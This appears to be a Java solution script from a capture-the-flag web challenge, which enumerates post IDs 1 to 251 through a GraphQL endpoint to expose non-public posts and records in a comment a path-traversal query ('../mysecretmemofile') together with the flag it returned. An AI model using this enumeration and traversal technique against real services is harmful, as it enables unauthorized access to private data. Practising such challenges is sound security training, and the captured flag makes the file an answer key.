package it.reply.tamangoteam.challenge.web;

import java.util.HashMap;
import java.util.Map;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import it.reply.tamangoteam.utils.WebUtils;

class MazeGraphMain {
	
	private static final Logger log = LogManager.getLogger();
	
	private static final String POST_TEMPLATE = "{post (id: %d){id,title,content,public,author {id}}}";

	public static void main(String[] args) {
		
		// Starting point: http://gamebox1.reply.it/a37881ac48f4f21d0fb67607d6066ef7/
		
		// GraphQL endpoint: http://gamebox1.reply.it/a37881ac48f4f21d0fb67607d6066ef7/graphql
		
		Map<String, String> postParameters = new HashMap<>();
		postParameters.put("raw", "true");
		
		for(int i=1; i<=251; i++) {
			postParameters.put("query", String.format(POST_TEMPLATE, i));

			String response = WebUtils.doGet("http://gamebox1.reply.it/a37881ac48f4f21d0fb67607d6066ef7/graphql", postParameters);
			
			if(response.contains("FLG")) {
				log.warn(response); // Nothing found
			} else {
				log.info(response); // Interesting record: {"data":{"post":{"id":"40","title":"Personal notes","content":"Remember to delete the  asset.","public":false,"author":{"id":"1"}}}}

			}
		}

		/*
		 * GraphQL request:
		 * 		{ getAsset(name: "../mysecretmemofile") }
		 * 
		 * GraphQL response:
		 * 		{ "data": { "getAsset": "{FLG:st4rt0ffwith4b4ng!}\n" } }
		 */
	}
}